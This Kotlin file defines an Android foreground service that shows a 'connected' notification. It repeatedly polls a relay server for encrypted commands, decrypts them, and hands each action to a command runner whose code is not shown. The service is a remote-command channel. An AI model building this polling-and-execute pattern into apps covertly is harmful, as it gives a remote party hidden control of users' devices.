package com.vlink.consent

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class LinkService : Service() {
    companion object {
        @Volatile var running = false
        fun start(c: Context) {
            androidx.core.content.ContextCompat.startForegroundService(c, Intent(c, LinkService::class.java))
        }
    }

    private var alive = true

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        running = true
        EventLog.channel(this)
        startForeground(3100, Fg.build(this, "VLink", "متصل"))
        Thread { loop() }.start()
    }

    private fun loop() {
        val net = Net(this)
        while (alive) {
            if (net.relay.isBlank() || net.token.isBlank()) { Thread.sleep(5000); continue }
            val cmd = poll(net)
            if (cmd != null) runCatching {
                Cmd.run(this, cmd.optString("action"), cmd.optJSONObject("args") ?: JSONObject())
            } else Thread.sleep(1500)
        }
    }

    private fun poll(net: Net): JSONObject? = runCatching {
        val c = URL(net.relay.trimEnd('/') + "/cmd?wait=25").openConnection() as HttpURLConnection
        c.connectTimeout = 10000
        c.readTimeout = 35000
        c.setRequestProperty("x-token", net.token)
        if (c.responseCode != 200) { c.disconnect(); return null }
        val raw = c.inputStream.readBytes()
        c.disconnect()
        val plain = Crypto.open(net.key, raw) ?: return null
        JSONObject(String(plain))
    }.getOrNull()

    override fun onDestroy() { alive = false; running = false; super.onDestroy() }
}
